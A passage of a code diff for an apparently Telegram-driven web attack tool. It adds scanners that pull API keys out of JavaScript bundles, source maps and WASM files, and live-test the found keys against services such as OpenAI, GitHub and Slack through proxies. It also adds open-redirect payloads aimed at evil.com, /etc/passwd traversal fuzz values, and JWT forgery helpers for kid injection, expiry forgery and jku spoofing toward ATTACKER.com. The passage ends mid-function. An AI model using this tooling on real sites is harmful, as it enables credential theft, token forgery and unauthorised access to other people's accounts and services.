+                    href = a["href"].strip()
+                    # Skip anchors, mailto, js:, external
+                    if not href or href.startswith(("#","mailto:","javascript:","tel:")):
+                        continue
+                    full = _uj(url, href).split("#")[0].rstrip("/")
+                    # Same origin only
+                    if not full.startswith(_origin):
+                        continue
+                    # Skip binary/media extensions
+                    _ext = full.rsplit(".",1)[-1].lower() if "." in full.rsplit("/",1)[-1] else ""
+                    if _ext in ("pdf","png","jpg","jpeg","gif","svg","ico","zip","woff","woff2","ttf"):
+                        continue
+                    if full not in visited and full not in queue:
+                        queue.append(full)
+            except Exception:
+                pass
+
+    return results
+
+
+def _merge_crawl_results(results: list) -> dict:
+    """Merge multiple page extract dicts into one unified dict for scanning."""
+    if not results:
+        return {"error": "no pages crawled", "html": "", "network_log": [],
+                "console_log": [], "dom_result": None, "page_url": ""}
+    merged = {
+        "error":       None,
+        "html":        results[0].get("html",""),
+        "network_log": [],
+        "console_log": [],
+        "dom_result":  results[0].get("dom_result"),
+        "page_url":    results[0].get("page_url",""),
+        "pages_crawled": len(results),
+    }
+    seen_urls = set()
+    for r in results:
+        for entry in r.get("network_log",[]):
+            u = entry.get("url","")
+            if u not in seen_urls:
+                seen_urls.add(u)
+                merged["network_log"].append(entry)
+        merged["console_log"].extend(r.get("console_log",[]))
+        # Accumulate HTML for pattern scanning
+        extra_html = r.get("html","")
+        if extra_html and extra_html != merged["html"]:
+            merged["html"] += f"\n<!-- PAGE: {r.get('page_url','')} -->\n" + extra_html[:30000]
+    return merged
+
+
 def _extract_run(url: str, js_code: str, progress_cb=None) -> dict:
     """Try Playwright first, fallback to static."""
     if progress_cb: progress_cb("🌐 Launching browser...")
     data = _run_playwright_extract(url, js_code, progress_cb)
     if data.get("error") == "playwright_not_installed":
-        if progress_cb: progress_cb("⚠️ Playwright not found — static scan fallback...")
+        if progress_cb:
+            progress_cb(
+                "⚠️ *Playwright not installed* — static fallback mode\n"
+                "⚠️ Dynamic tokens (localStorage, sessionStorage, IDB, ShadowDOM) မရနိုင် — HTML + linked JS only"
+            )
         data = _static_extract(url)
     return data
 
@@ -7512,6 +6837,73 @@ _API_KEY_PATTERNS = [
     ("Generic API Key",                  re.compile(r'(?i)(?:api[_\-]?key|apikey|api[_\-]?token|access[_\-]?key|secret[_\-]?key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,80})["\']')),
 ]
 
+# Phase 2: process.env / import.meta.env static replacement scan
+# Bundlers (webpack/vite) inline these at build time — scan for residue patterns
+_ENV_INJECT_PATTERNS = [
+    # webpack DefinePlugin inlines: "process.env.X" → ""value""
+    ("process.env key",   re.compile(r'process\.env\.([A-Z_]{3,60})\s*(?:,|\)|\s)')),
+    # vite inlines import.meta.env.X → actual value in bundle
+    ("import.meta.env",   re.compile(r'import\.meta\.env\.([A-Z_]{3,60})')),
+    # Residual quoted values after inlining: "AKIA..." "sk-..." adjacent to env ref
+    ("Inlined env value", re.compile(
+        r'(?:process\.env\.[A-Z_]+|import\.meta\.env\.[A-Z_]+)'
+        r'\s*[,|&?:)]\s*["\']([A-Za-z0-9_\-+=/]{16,120})["\']'
+    )),
+    # __webpack_require__ env object: {REACT_APP_KEY:"value"}
+    ("Webpack env obj",   re.compile(
+        r'"(?:REACT_APP|NEXT_PUBLIC|VITE_|VUE_APP)_([A-Z_]+)"\s*:\s*"([A-Za-z0-9_\-+=/]{10,120})"'
+    )),
+]
+
+
+def _scan_env_injections(network_log: list) -> list:
+    """
+    Phase 2: Scan JS bundle bodies for inlined process.env / import.meta.env values.
+    Returns list of {type, name, value, source} dicts.
+    """
+    findings = []
+    seen = set()
+    for entry in network_log:
+        body = entry.get("response_body", "")
+        if not body or len(body) < 50:
+            continue
+        src_label = f"JS: {entry['url'][:80]}"
+        for pat_name, pat in _ENV_INJECT_PATTERNS:
+            for m in pat.finditer(body):
+                if m.lastindex and m.lastindex >= 2:
+                    # Webpack env obj: group1=key_suffix, group2=value
+                    name  = m.group(1)
+                    value = m.group(2)
+                elif m.lastindex == 1:
+                    val = m.group(1).strip()
+                    # process.env ref — just the key name, not a value
+                    if pat_name in ("process.env key", "import.meta.env"):
+                        dedup = "env_key:" + val
+                        if dedup not in seen:
+                            seen.add(dedup)
+                            findings.append({"type": "Env var reference", "name": val,
+                                             "value": f"[referenced, value not inlined]",
+                                             "source": src_label})
+                        continue
+                    name  = pat_name
+                    value = val
+                else:
+                    continue
+                dedup = "env:" + name + ":" + value[:60]
+                if dedup in seen or len(value) < 8:
+                    continue
+                seen.add(dedup)
+                # Also check if value looks like a real key
+                is_key = any(p.search(value) for _, p in _API_KEY_PATTERNS)
+                findings.append({
+                    "type":    pat_name + (" [KEY MATCH]" if is_key else ""),
+                    "name":    name,
+                    "value":   value[:200],
+                    "source":  src_label,
+                })
+    return findings
+
+
 _APIKEY_JS_EVAL = """() => {
     const results = {};
     const kwds = ['apiKey','api_key','apikey','accessKey','secretKey','authToken',
@@ -7530,6 +6922,271 @@ _APIKEY_JS_EVAL = """() => {
     });
     return results;
 }"""
+
+# ─────────────────────────────────────────────────────────────────
+# Phase 3 Fix 3: API key live validation
+# Light probe — HEAD/GET with key, check HTTP status only.
+# Never exfiltrate or use the key — status check only.
+# ─────────────────────────────────────────────────────────────────
+_KEY_VALIDATORS = {
+    "Google Maps / Places / YouTube": {
+        "url":    "https://maps.googleapis.com/maps/api/geocode/json?address=test&key={key}",
+        "method": "GET",
+        "valid_if":   lambda r: r.status_code == 200 and '"status"' in r.text and '"REQUEST_DENIED"' not in r.text,
+        "invalid_if": lambda r: "REQUEST_DENIED" in r.text or "API_KEY_INVALID" in r.text,
+    },
+    "OpenAI": {
+        "url":    "https://api.openai.com/v1/models",
+        "method": "GET",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "AWS Access Key ID": None,   # needs secret — skip live probe
+    "SendGrid": {
+        "url":    "https://api.sendgrid.com/v3/user/profile",
+        "method": "GET",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code in (401, 403),
+    },
+    "GitHub Token": {
+        "url":    "https://api.github.com/user",
+        "method": "GET",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code == 200 and '"login"' in r.text,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "Slack Bot Token": {
+        "url":    "https://slack.com/api/auth.test",
+        "method": "POST",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code == 200 and '"ok":true' in r.text,
+        "invalid_if": lambda r: '"ok":false' in r.text,
+    },
+    "Mapbox Token": {
+        "url":    "https://api.mapbox.com/tokens/v2?access_token={key}",
+        "method": "GET",
+        "valid_if":   lambda r: r.status_code == 200 and '"code":"TokenValid"' in r.text,
+        "invalid_if": lambda r: '"code":"TokenExpired"' in r.text or '"code":"TokenMalformed"' in r.text,
+    },
+}
+
+
+def _validate_api_key(key_type: str, key_value: str, timeout: int = 6) -> dict:
+    """
+    Phase 3: Live-probe one API key.
+    Returns {"status": "valid"|"invalid"|"unknown"|"skipped", "note": str}
+    """
+    validator = _KEY_VALIDATORS.get(key_type)
+    if validator is None:
+        return {"status": "skipped", "note": "No probe configured"}
+
+    url      = validator["url"].replace("{key}", key_value)
+    method   = validator.get("method", "GET")
+    hdrs     = {k: v.replace("{key}", key_value)
+                for k, v in validator.get("headers", {}).items()}
+    hdrs.update(_get_headers())
+
+    try:
+        if method == "GET":
+            r = requests.get(url, headers=hdrs, timeout=timeout, verify=False,
+                             proxies=proxy_manager.get_proxy())
+        else:
+            r = requests.post(url, headers=hdrs, timeout=timeout, verify=False,
+                              proxies=proxy_manager.get_proxy())
+
+        if validator["valid_if"](r):
+            return {"status": "valid", "note": f"HTTP {r.status_code} — key accepted"}
+        if validator["invalid_if"](r):
+            return {"status": "invalid", "note": f"HTTP {r.status_code} — key rejected"}
+        return {"status": "unknown", "note": f"HTTP {r.status_code} — inconclusive"}
+    except Exception as e:
+        return {"status": "error", "note": str(e)[:80]}
+
+
+def _validate_findings(findings: list, progress_cb=None) -> list:
+    """
+    Run live validation on all findings that have a known validator.
+    Mutates each finding dict in-place, adds 'validation' key.
+    Returns list of validated findings (valid ones first).
+    """
+    PROBEABLE = set(_KEY_VALIDATORS.keys()) - {k for k,v in _KEY_VALIDATORS.items() if v is None}
+    validated = 0
+    for f in findings:
+        ktype = f.get("type","")
+        val   = f.get("value","")
+        if not val or len(val) < 10:
+            continue
+        # Match key_type prefix
+        matched = next((k for k in PROBEABLE if k in ktype), None)
+        if not matched:
+            continue
+        if progress_cb and validated == 0:
+            progress_cb("🔬 Live-validating discovered API keys...")
+        result = _validate_api_key(matched, val)
+        f["validation"] = result
+        validated += 1
+        if progress_cb:
+            emoji = {"valid":"✅","invalid":"❌","unknown":"❓","skipped":"⏭️","error":"⚠️"}.get(result["status"],"❓")
+            progress_cb(f"  {emoji} `{ktype[:30]}` → {result['note']}")
+
+    # Sort: valid → unknown → invalid → skipped/error
+    _vsort = {"valid":0,"unknown":1,"invalid":2,"skipped":3,"error":4}
+    findings.sort(key=lambda f: _vsort.get(f.get("validation",{}).get("status","skipped"), 3))
+    return findings
+
+
+def _scan_wasm_secrets(base_url: str, network_log: list) -> list:
+    """
+    Phase 3 Fix 4: WASM binary secret scan.
+    - Finds .wasm URLs from network_log + HTML
+    - Fetches binary, extracts printable ASCII strings >= 8 chars
+    - Runs _API_KEY_PATTERNS + _CSRF_PATTERNS on extracted strings
+    """
+    import struct
+    findings = []
+    seen_wasm = set()
+    wasm_pat  = re.compile(r'([A-Za-z0-9/_\-.:?=&%]+\.wasm[A-Za-z0-9?=&%_]*)')
+
+    # Collect .wasm URLs from network log + seed page HTML
+    wasm_urls = set()
+    for entry in network_log:
+        url_e = entry.get("url","")
+        if ".wasm" in url_e:
+            wasm_urls.add(url_e)
+        for m in wasm_pat.finditer(entry.get("response_body","")[:80000]):
+            raw = m.group(1)
+            if not raw.startswith("http"):
+                from urllib.parse import urlparse as _up_w, urljoin as _uj_w
+                _base = _up_w(base_url)
+                raw = _uj_w(f"{_base.scheme}://{_base.netloc}", raw)
+            wasm_urls.add(raw)
+
+    if not wasm_urls:
+        return findings
+
+    def _extract_strings(data: bytes, min_len: int = 8) -> list:
+        """Extract printable ASCII strings from binary blob."""
+        strings = []
+        current = []
+        for byte in data:
+            c = chr(byte)
+            if c.isprintable() and c not in ("\x00",):
+                current.append(c)
+            else:
+                if len(current) >= min_len:
+                    strings.append("".join(current))
+                current = []
+        if len(current) >= min_len:
+            strings.append("".join(current))
+        return strings
+
+    for wasm_url in list(wasm_urls)[:10]:  # cap at 10 .wasm files
+        if wasm_url in seen_wasm:
+            continue
+        seen_wasm.add(wasm_url)
+        try:
+            r = requests.get(wasm_url, timeout=10, verify=False,
+                             headers=_get_headers(), proxies=proxy_manager.get_proxy(),
+                             stream=True)
+            if r.status_code != 200:
+                continue
+            # Cap at 5MB
+            raw = b""
+            for chunk in r.iter_content(65536):
+                raw += chunk
+                if len(raw) > 5_242_880:
+                    break
+            r.close()
+            # Validate WASM magic
+            if raw[:4] != b"\x00asm":
+                continue
+            strings = _extract_strings(raw)
+            text_blob = "\n".join(strings)
+            src_label = f"WASM: {wasm_url[:80]}"
+            for key_type, pat in _API_KEY_PATTERNS:
+                for m in pat.finditer(text_blob):
+                    val = (m.group(1) if m.lastindex else m.group(0)).strip()
+                    dedup = "wasm:" + key_type + ":" + val[:60]
+                    if dedup not in seen_wasm and len(val) >= 10:
+                        seen_wasm.add(dedup)
+                        findings.append({"type": key_type + " (WASM)",
+                                          "value": val[:200], "source": src_label})
+            for key_type, pat in _CSRF_PATTERNS:
+                for m in pat.finditer(text_blob):
+                    val = (m.group(1) if m.lastindex else m.group(0)).strip()
+                    dedup = "wasm_csrf:" + val[:60]
+                    if dedup not in seen_wasm and len(val) >= 8:
+                        seen_wasm.add(dedup)
+                        findings.append({"type": key_type + " (WASM)",
+                                          "name": key_type, "value": val[:200], "source": src_label})
+        except Exception:
+            pass
+    return findings
+
+
+def _fetch_sourcemap_keys(network_log: list) -> list:
+    """
+    Fix 5 (Phase 1): Source map fetch & parse.
+    Each JS bundle တွင် '//# sourceMappingURL=x.js.map' ပါလျှင် fetch ပြီး
+    sourcesContent ထဲ API key patterns run လုပ်သည်။
+    """
+    findings = []
+    seen_sm = set()
+    sm_url_pat = re.compile(r'//# sourceMappingURL=([^\s]+\.map)')
+
+    for entry in network_log:
+        body = entry.get("response_body", "")
+        if not body:
+            continue
+        js_url = entry.get("url", "")
+        # Extract sourceMappingURL from body tail (last 300 chars)
+        tail = body[-300:]
+        m = sm_url_pat.search(tail)
+        if not m:
+            continue
+        map_ref = m.group(1)
+        # Build absolute URL
+        if map_ref.startswith("http"):
+            map_url = map_ref
+        elif map_ref.startswith("//"):
+            from urllib.parse import urlparse as _up_sm
+            _parsed_js = _up_sm(js_url)
+            map_url = f"{_parsed_js.scheme}:{map_ref}"
+        else:
+            map_url = js_url.rsplit("/", 1)[0] + "/" + map_ref
+
+        if map_url in seen_sm:
+            continue
+        seen_sm.add(map_url)
+        try:
+            r = requests.get(map_url, timeout=8, verify=False,
+                             headers=_get_headers(), proxies=proxy_manager.get_proxy())
+            if r.status_code != 200 or len(r.text) < 50:
+                continue
+            sm_json = r.json()
+            sources_content = sm_json.get("sourcesContent") or []
+            sources_names   = sm_json.get("sources") or []
+            for idx, src_text in enumerate(sources_content):
+                if not src_text or len(src_text) < 20:
+                    continue
+                src_name = sources_names[idx] if idx < len(sources_names) else f"src[{idx}]"
+                for key_type, pat in _API_KEY_PATTERNS:
+                    for km in pat.finditer(src_text):
+                        val = (km.group(1) if km.lastindex else km.group(0)).strip()
+                        dedup = key_type + ":" + val[:60]
+                        if dedup not in seen_sm and len(val) >= 10:
+                            seen_sm.add(dedup)
+                            findings.append({
+                                "type":   key_type,
+                                "value":  val,
+                                "source": f"SourceMap: {src_name[:80]}",
+                            })
+        except Exception:
+            pass
+    return findings
+
 
 def _apikeys_sync(url: str, progress_cb=None) -> dict:
     data = _extract_run(url, _APIKEY_JS_EVAL, progress_cb)
@@ -7563,8 +7220,38 @@ def _apikeys_sync(url: str, progress_cb=None) -> dict:
         if len(str(v)) > 15:
             _add("window global", str(v)[:80], f"window.{k}")
 
+    # Source map scan (Phase 1 Fix 5)
+    if progress_cb:
+        progress_cb("🗺️ Checking source maps (.js.map)...")
+    sm_findings = _fetch_sourcemap_keys(data.get("network_log", []))
+    for sf in sm_findings:
+        _add(sf["type"], sf["value"], sf["source"])
+
+    # Env injection scan (Phase 2 Fix 3)
+    if progress_cb:
+        progress_cb("🔬 Scanning process.env / import.meta.env injections...")
+    env_findings = _scan_env_injections(data.get("network_log", []))
+    for ef in env_findings:
+        _add(ef["type"], ef.get("name", ef["type"]), ef["value"], ef["source"])
+
+    # Phase 3 Fix 4: WASM binary secret scan
+    if progress_cb:
+        progress_cb("🕵️ Scanning WASM binaries for secrets...")
+    wasm_findings = _scan_wasm_secrets(url, data.get("network_log", []))
+    for wf in wasm_findings:
+        _add(wf["type"], wf.get("value","")[:60], wf["source"])
+
+    # Phase 3: Live validation of discovered keys
+    if progress_cb:
+        progress_cb("🔬 Running live key validation...")
+    findings = _validate_findings(findings, progress_cb)
+
+    valid_count = len([f for f in findings if f.get("validation",{}).get("status") == "valid"])
     return {"error": None, "findings": findings, "page_url": data["page_url"],
-            "requests": len(data.get("network_log", []))}
+            "requests": len(data.get("network_log", [])),
+            "sourcemap_scanned": len(sm_findings) > 0,
+            "env_refs":    len([e for e in env_findings if "KEY MATCH" in e.get("type","")]),
+            "valid_keys":  valid_count}
 
 
 async def cmd_apikeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -8693,140 +8380,932 @@ _HIDDEN_JS_EVAL = """() => {
     return res;
 }"""
 
-_CSRF_PATTERNS = [
-    ("CSRF Token",              re.compile(r'(?i)(?:csrf|xsrf|_token|verification.token)\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{20,200})["\']')),
-    ("Nonce",                   re.compile(r'(?i)(?:nonce|__nonce__)\s*[=:]\s*["\']([A-Za-z0-9+/=]{20,100})["\']')),
-    ("Laravel CSRF Token",      re.compile(r'(?i)(?:_token|laravel.token)\s*[=:]\s*["\']([A-Za-z0-9+/=]{40,80})["\']')),
-    ("Django CSRF",             re.compile(r'(?i)csrfmiddlewaretoken\s*[=:]\s*["\']([A-Za-z0-9]{40,80})["\']')),
-    ("Rails Authenticity Token",re.compile(r'(?i)authenticity.token\s*[=:]\s*["\']([A-Za-z0-9+/=]{40,100})["\']')),
-    ("WordPress Nonce",         re.compile(r'(?i)wp.{0,5}nonce\s*[=:]\s*["\']([A-Za-z0-9]{10})["\']')),
-    ("JWT Bearer Token",        re.compile(r'(?i)(?:bearer|authorization)\s*[=:]\s*["\']?(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)')),
+
+
+# ─── PATCHED NEW FUNCTIONS/GLOBALS ─────────────────────
+
+_OPEN_REDIRECT_PAYLOADS = [
+    "//evil.com", "https://evil.com", "/\\evil.com",
+    "/%2F%2Fevil.com", "//evil.com%2F%2E%2E",
+    "https:///evil.com", "///evil.com",
+    "/%09/evil.com", "https://evil.com%23",
+    "https://evil.com?redirect=",
 ]
 
+
+_REDIRECT_PARAMS = [
+    "redirect", "redirect_uri", "redirect_url", "return",
+    "return_to", "returnUrl", "next", "url", "goto",
+    "dest", "destination", "target", "redir", "r",
+]
+
+
+
+def _check_cors_misconfig(url: str) -> dict:
+    """Send evil origin, check if reflected in ACAO header."""
+    evil_origin = "https://evil-attacker.com"
+    try:
+        r = requests.options(
+            url, timeout=8, verify=False,
+            headers={**_get_headers(), "Origin": evil_origin},
+            proxies=proxy_manager.get_proxy()
+        )
+        acao = r.headers.get("Access-Control-Allow-Origin", "")
+        acac = r.headers.get("Access-Control-Allow-Credentials", "")
+        if evil_origin in acao or acao == "*":
+            risk = "CRITICAL" if acac.lower() == "true" else "HIGH"
+            return {
+                "vulnerable": True,
+                "acao": acao,
+                "acac": acac,
+                "severity": risk,
+                "note": (
+                    "CRITICAL: Origin reflected + credentials=true → full auth bypass"
+                    if risk == "CRITICAL"
+                    else "HIGH: Origin reflected → data leakage possible"
+                ),
+            }
+    except Exception:
+        pass
+    return {"vulnerable": False}
+
+
+
+def _check_open_redirect(url: str) -> list:
+    """Test common redirect params with evil payloads."""
+    found = []
+    parsed = urlparse(url)
+    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    for param in _REDIRECT_PARAMS[:6]:
+        for payload in _OPEN_REDIRECT_PAYLOADS[:5]:
+            test_url = f"{base}?{param}={payload}"
+            try:
+                r = requests.get(
+                    test_url, timeout=5, verify=False,
+                    headers=_get_headers(),
+                    proxies=proxy_manager.get_proxy(),
+                    allow_redirects=False,
+                )
+                loc = r.headers.get("Location", "")
+                if r.status_code in (301, 302, 303, 307, 308) and (
+                    "evil" in loc or loc.startswith("//") or loc.startswith("https://evil")
+                ):
+                    found.append({
+                        "param":    param,
+                        "payload":  payload,
+                        "location": loc[:120],
+                        "status":   r.status_code,
+                        "severity": "HIGH",
+                    })
+                    break  # one hit per param is enough
+            except Exception:
+                pass
+    return found
+
+
+
+_TECH_WORDLISTS = {
+    "Laravel":   [
+        ".env", "artisan", "storage/logs/laravel.log",
+        "public/storage", "api/user", "api/auth/login",
+        "telescope", "horizon", "_ignition/health-check",
+    ],
+    "Django":    [
+        "admin/", "admin/login/", "api/schema/", "api/docs/",
+        "static/admin/", "__debug__/", "api/v1/", "api/v2/",
+    ],
+    "WordPress": [
+        "wp-admin/", "wp-login.php", "wp-json/wp/v2/users",
+        "xmlrpc.php", "wp-content/debug.log", "wp-config.php.bak",
+        "wp-content/uploads/", "readme.html",
+    ],
+    "Rails":     [
+        "rails/info/properties", "rails/info/routes",
+        "sidekiq", "api/v1/", "cable", "active_storage/",
+    ],
+    "Express":   [
+        "api/", "api/v1/", "graphql", "swagger.json",
+        "openapi.json", "metrics", "health", "status",
+    ],
+    "Spring":    [
+        "actuator/", "actuator/health", "actuator/env",
+        "actuator/mappings", "actuator/beans", "swagger-ui.html",
+        "v2/api-docs", "h2-console/",
+    ],
+    "Next.js":   [
+        "_next/static/", "api/", "api/auth/", "api/graphql",
+        "_next/data/", "404", "__nextjs_original-stack-frame",
+    ],
+    "FastAPI":   [
+        "docs", "redoc", "openapi.json", "api/v1/",
+        "healthz", "metrics",
+    ],
+}
+
+
+_BACKUP_EXTENSIONS = [
+    ".bak", ".old", ".orig", ".swp", ".tmp", "~",
+    ".backup", ".copy", ".save", ".1", ".2",
+    ".tar.gz", ".zip", ".sql", ".sql.gz",
+]
+
+
+_SMART_FUZZ_PARAMS = {
+    "debug": ["1", "true", "yes"],
+    "test":  ["1", "true"],
+    "id":    ["1", "0", "-1", "9999"],
+    "page":  ["../etc/passwd", "....//....//etc/passwd"],
+    "file":  ["../etc/passwd", "/etc/passwd"],
+    "admin": ["1", "true"],
+    "token": ["null", "undefined", ""],
+    "format": ["json", "xml", "yaml"],
+    "callback": ["test", "jsonp"],
+    "pretty": ["1", "true"],
+    "XDEBUG_SESSION_START": ["phpstorm"],
+}
+
+
+
+def _detect_tech_stack(url: str) -> list:
+    """Quick tech stack detection for wordlist selection."""
+    detected = []
+    try:
+        r = requests.get(
+            url, timeout=8, verify=False,
+            headers=_get_headers(),
+            proxies=proxy_manager.get_proxy()
+        )
+        body    = r.text[:50000]
+        headers = dict(r.headers)
+        powered = headers.get("X-Powered-By", "").lower()
+        server  = headers.get("Server", "").lower()
+        cookie  = str(headers.get("Set-Cookie", "")).lower()
+
+        sigs = {
+            "Laravel":   ["laravel_session", "laravel", "_ignition"],
+            "Django":    ["csrfmiddlewaretoken", "django", "wsgi"],
+            "WordPress": ["wp-content", "wp-json", "wordpress"],
+            "Rails":     ["_rails", "x-runtime", "__proxyee"],
+            "Express":   ["express", "x-powered-by: express"],
+            "Spring":    ["x-application-context", "spring"],
+            "Next.js":   ["__next", "_next/static", "__NEXT_DATA__"],
+            "FastAPI":   ["fastapi", "docs#/"],
+        }
+        combined = body + powered + server + cookie
+        for tech, patterns in sigs.items():
+            if any(p.lower() in combined for p in patterns):
+                detected.append(tech)
+    except Exception:
+        pass
+    return detected
+
+
+
+def _b64url_encode(d: dict) -> str:
+    return (
+        _b64.b64encode(json.dumps(d, separators=(",", ":")).encode())
+        .decode().rstrip("=").replace("+", "-").replace("/", "_")
+    )
+
+
+
+def _jwt_kid_injection(token: str) -> dict:
+    """
+    kid header injection:
+      - Path traversal → /dev/null or /etc/passwd
+      - SQL injection → ' OR 1=1--
+    """
+    parts = token.split(".")
+    if len(parts) != 3:
+        return {"success": False}
+    try:
+        dec = _jwt_decode_payload(token)
+        if "error" in dec:
+            return {"success": False, "error": dec["error"]}
+
+        payloads = {
+            "path_traversal_null":   "../../../../../../dev/null",
+            "path_traversal_passwd": "../../../../../../etc/passwd",
+            "sql_injection":         "' UNION SELECT 'attacker_secret' --",
+            "sql_injection_mysql":   "0 UNION SELECT 'attacker_secret'",
+            "empty_string":          "",
+        }
+        forged = {}
+        for name, kid_val in payloads.items():
+            # Sign with empty string / null-derived secret
+            h = {**dec["header"], "kid": kid_val}
+            forged[name] = {
+                "header":      h,
+                "token_prefix": f"{_b64url_encode(h)}.{parts[1]}.",
+                "note":        "Sign with empty string '' as secret if kid resolves to /dev/null",
+            }
+
+        return {
+            "success":  True,
+            "method":   "kid_injection",
+            "payloads": forged,
+            "note":     (
+                "If server uses kid to load secret key from filesystem or DB, "
+                "path traversal or SQLi in kid may allow forging any payload."
+            ),
+        }
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+
+def _jwt_exp_forgery(token: str) -> dict:
+    """Forge exp, nbf, iat claims to extend validity."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return {"success": False}
+    try:
+        dec = _jwt_decode_payload(token)
+        if "error" in dec:
+            return {"success": False, "error": dec["error"]}
+
+        payload = dict(dec["payload"])
+        orig_exp = payload.get("exp", "not set")
+        payload["exp"] = 9999999999   # year 2286
+        payload["nbf"] = 0
+        payload["iat"] = 0
+
+        forged_payload_b64 = _b64url_encode(payload)
+        note = (
+            "Replace the payload segment with this and keep original sig. "
+            "Works if server skips exp validation or uses 'alg: none'."
+        )
+        return {
+            "success":          True,
+            "original_exp":     orig_exp,
+            "forged_exp":       9999999999,
+            "forged_payload":   forged_payload_b64,
+            "full_token_template": f"{parts[0]}.{forged_payload_b64}.{parts[2]}",
+            "method":           "exp_forgery",
+            "note":             note,
+        }
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+
+def _jwt_jwks_spoof(token: str, target_url: str = "") -> dict:
+    """
+    jku / x5u header injection — point to attacker-controlled JWKS.
+    Also checks if /.well-known/jwks.json is publicly accessible.
+    """
+    parts = token.split(".")
+    if len(parts) != 3:
+        return {"success": False}
+    try:
+        dec = _jwt_decode_payload(token)
+        if "error" in dec:
+            return {"success": False}
+
+        orig_alg = dec["header"].get("alg", "HS256")
+        rs_likely = orig_alg in ("RS256", "RS384", "RS512", "ES256", "ES384")
+
+        jwks_public = None
+        if target_url:
+            parsed = urlparse(target_url)
+            jwks_url = f"{parsed.scheme}://{parsed.netloc}/.well-known/jwks.json"
+            try:
+                r = requests.get(jwks_url, timeout=6, verify=False, headers=_get_headers())
+                if r.status_code == 200 and "keys" in r.text:
+                    jwks_public = jwks_url
+            except Exception:
+                pass
+
+        spoof_template = {
+            "jku": {
+                "header_addition": {"jku": "https://ATTACKER.com/jwks.json"},
+                "note": "Server fetches JWK from jku URL to verify sig — point to attacker-controlled server",
+            },
+            "x5u": {
+                "header_addition": {"x5u": "https://ATTACKER.com/cert.pem"},
+                "note": "Server fetches X.509 cert from x5u to verify sig — embed attacker cert",
+            },
+            "embedded_jwk": {
+                "header_addition": {"jwk": {"kty": "RSA", "n": "ATTACKER_N", "e": "AQAB"}},
+                "note": "Embed attacker public key directly in header — server verifies with it",
+            },
+        }
+
+        return {
+            "success":         True,
+            "method":          "jwks_spoof",
+            "original_alg":    orig_alg,
+            "rs_likely":       rs_likely,
+            "jwks_public_url": jwks_public,
+            "injection_templates": spoof_template,
+            "note": (
+                "RS256/ES256 tokens are most vulnerable. "
+                + ("JWKS endpoint exposed at: " + jwks_public if jwks_public else "JWKS not publicly found.")
+            ),
+        }
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+
+_HIDDEN_JS_EVAL_IMPROVED = """async () => {
+    const res = {tokens: [], localStorage: {}, sessionStorage: {}, cookies: [], indexedDBKeys: [], shadowTokens: []};
+
+    // ── Hidden form inputs (main DOM) ──
+    document.querySelectorAll('input[type=hidden], input[type=text][name*=token], input[name*=csrf], input[name*=nonce], input[name*=verify]').forEach(el => {
+        if (el.value && el.value.length >= 8) {
+            res.tokens.push({name: el.name || el.id || 'hidden', value: el.value.substring(0, 200), tag: el.tagName});
+        }
+    });
+
+    // ── Meta tag tokens ──
+    document.querySelectorAll('meta[name]').forEach(m => {
+        const n = (m.getAttribute('name') || '').toLowerCase();
+        const c = m.getAttribute('content') || '';
+        if ((n.includes('csrf') || n.includes('token') || n.includes('nonce') || n.includes('xsrf')) && c.length >= 8) {
+            res.tokens.push({name: n, value: c.substring(0, 200), tag: 'META'});
+        }
+    });
+
+    // ── ShadowDOM (open mode) traversal ──
+    // Closed-mode roots inaccessible from JS — we patch open ones.
+    try {
+        const walk = (root) => {
+            root.querySelectorAll('*').forEach(el => {
+                if (el.shadowRoot) {
+                    el.shadowRoot.querySelectorAll('input[type=hidden], input[name*=csrf], input[name*=token], input[name*=nonce]').forEach(si => {
+                        if (si.value && si.value.length >= 8) {
+                            res.shadowTokens.push({name: si.name || si.id || 'shadow-hidden', value: si.value.substring(0, 200), host: el.tagName});
+                        }
+                    });
+                    walk(el.shadowRoot);
+                }
+            });
+        };
+        walk(document);
+    } catch(e) {}
+
+    // ── localStorage ──
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const k = localStorage.key(i);
+            const v = localStorage.getItem(k) || '';
+            if (v.length >= 5) res.localStorage[k] = v.substring(0, 200);
+        }
+    } catch(e) {}
+
+    // ── sessionStorage ──
+    try {
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const k = sessionStorage.key(i);
+            const v = sessionStorage.getItem(k) || '';
+            if (v.length >= 5) res.sessionStorage[k] = v.substring(0, 200);
+        }
+    } catch(e) {}
+
+    // ── JS-accessible cookies ──
+    try {
+        document.cookie.split(';').forEach(c => {
+            const [name, ...rest] = c.trim().split('=');
+            const value = rest.join('=');
+            if (name && value && value.length >= 5) {
+                res.cookies.push({name: name.trim(), value: value.trim().substring(0, 200)});
+            }
+        });
+    } catch(e) {}
+
+    // ── IndexedDB database names (async — fix: was in sync fn, always threw) ──
+    try {
+        const dbs = await indexedDB.databases();
+        dbs.forEach(d => res.indexedDBKeys.push(d.name || 'unknown'));
+    } catch(e) {
+        res.indexedDBKeys.push('__idb_error__:' + String(e).substring(0, 80));
+    }
+
+    return res;
+}"""
+
+
+
+def _scan_service_worker(url: str) -> list:
+    """
+    Phase 2: SW scope + Workbox precache manifest parse.
+    - Service-Worker-Allowed header → discover non-root scope SW paths
+    - Workbox __WB_MANIFEST precache list → enumerate cached asset URLs
+    - Cache install event URL list scan for tokens
+    """
+    parsed   = urlparse(url)
+    origin   = f"{parsed.scheme}://{parsed.netloc}"
+    sw_paths = [
+        "/sw.js", "/service-worker.js", "/serviceworker.js",
+        "/sw-v1.js", "/firebase-messaging-sw.js",
